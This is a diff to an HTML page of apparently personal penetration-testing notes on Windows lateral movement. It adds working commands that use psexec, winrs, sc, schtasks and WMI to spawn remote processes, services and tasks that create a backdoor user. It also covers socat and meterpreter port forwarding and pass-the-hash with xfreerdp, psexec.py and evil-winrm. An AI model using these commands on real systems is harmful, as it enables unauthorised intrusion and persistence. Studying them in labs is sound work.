@@ -85,24 +85,88 @@
                           <li>Ports 445</li>
                           <li>Administrator group required</li>
                           <li>Part of sysinternals</li>
-                          <li>psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</li>
+                          <li>Spawn Remote Process</li>
+                          <ul>
+                            <li>psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</li>
+                          </ul>
                         </ul>
                         <li>WinRM</li>
                         <ul>
                           <li>Ports 5985 or 5986 over HTTP</li>
                           <li>Remote Management Users group required</li>
                           <li>Usually enabled by default</li>
-                          <li>winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</li>
+                          <li>Spawn Remote Process</li>
+                          <ul>
+                            <li>winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</li>
+                          </ul>
                         </ul>
                         <li>sc</li>
                         <ul>
                           <li>Ports 135/TCP, 49152-65535/TCP (DCE/RPC) or 445/TCP (RPC over SMB Named Pipes) or 139/TCP (RPC over SMB Named Pipes)</li>
                           <li>Administrator group required</li>
-                          <li>sc.exe \\TARGET create Malservice binPath= "net user John Pass123 /add" start= auto; sc.exe \\TARGET start Malservice</li>
+                          <li>Spawn Remote Service</li>
+                          <ul>
+                            <li>sc.exe \\TARGET create MalService1 binPath= "net user eli2k Pass123 /add" start= auto; sc.exe \\TARGET start MalService1</li>
+                          </ul>
                         </ul>
                         <li>schtasks</li>
                         <ul>
-                          <li>schtasks /s TARGET /RU "SYSTEM" /create /tn "Maltask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00; schtasks /s TARGET /run /TN "Maltask1"</li>
+                          <li>Spawn Remote Task</li>
+                          <ul>
+                            <li>schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;Maltask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00; schtasks /s TARGET /run /TN &quot;MalTask1&quot;</li>
+                          </ul>
+                        </ul>
+                        <li>WMI</li>
+                        <ul>
+                          <li>Ports 135/TCP, 49152-65535/TCP or 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)</li>
+                          <li>Administrator Group Required</li>
+                          <li>PSCredential object required</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</code></pre></li>
+                          </ul>
+                          <li>Establish WMI session:</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop</code></pre></li>
+                          </ul>
+                          <li>Remote Process Creation</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value beepbeepboopboop";
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}</code></pre></li>
+                          </ul>
+                          <li>Remote Service Creation</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "MalService2";
+DisplayName = "MalService2";
+PathName = "net user eli2k Pass123 /add"; # Your payload
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}</code></pre></li>
+                            <li><pre><code class="language-powershell">$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'MalService2'"
+
+Invoke-CimMethod -InputObject $Service -MethodName StartService</code></pre></li>
+                          </ul>
+                          <li>Remote Task Creation</li>
+                          <ul>
+                            <li><pre><code class="language-powershell"># Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user eli2k Pass123 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "MalTask2"
+Start-ScheduledTask -CimSession $Session -TaskName "MalTask2"</code></pre></li>
+                          </ul>
+                          <li>Installing MSI packages through WMI</li>
+                          <ul>
+                            <li><pre><code class="language-powershell">Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}</code></pre></li>
+                          </ul>
                         </ul>
                       </ul>
                     </div>
@@ -133,9 +197,9 @@ proxychains nmap -sn 255.255.255.0/24 #this will take a long time even though it
                         "language-bash">ip route add 255.255.255.0/24 via 10.0.0.100 dev eth0</code></pre>
                       </div>
                     </div>
-                    <h3>Tunneling</h3>
+                    <h3>Port Forwarding</h3>
                     <div>
-                      <h4>Scenario</h4>
+                      <h4>Scenario #1</h4>
                       <div>
                         <p>Imagine a scenario where there is a machine
                         running windows that prevents outbound
@@ -159,10 +223,7 @@ proxychains nmap -sn 255.255.255.0/24 #this will take a long time even though it
                         <pre><code class=
                         "language-powershell"> socat TCP-LISTEN:2765,bind=MACHINEIP,fork,reuseaddr TCP:OURIP:2765&</code></pre>
                       </div>
-                    </div>
-                    <h3>Port Forwarding</h3>
-                    <div>
-                      <h4>Scenario</h4>
+                      <h4>Scenario< #2/h4>
                       <div>
                         <p>What if you find a service that listens only
                         to local connections such as:</p><img src=
@@ -180,6 +241,30 @@ curl https://127.0.0.1:80
 
 #metasploit
 meterpreter&gt;portfwd add -l 80 -p 8989 -r target.com</code></pre>
+                      </div>
+                    </div>
+                    <h3>Alternate Channels</h3>
+                    <div>
+                      <h4>NTLM</h4>
+                      <div>
+                        <ul>
+                          <li>Pass-the-Hash</li>
+                          <ol>
+                            <li>Dump Hash</li>
+                            <li><pre><code class="language-bash">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+
+psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+
+evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</code></pre></li>
+                          </ol>
+                        </ul>
+                      </div>
+                      <h4>Kerberos</h4>
+                      <div>
+                        <ul>
+                          <li>Pass-the-Ticket</li>
+                          <li>Pass-the-Key</li>
+                        </ul>
                       </div>
                     </div>
                   </div>
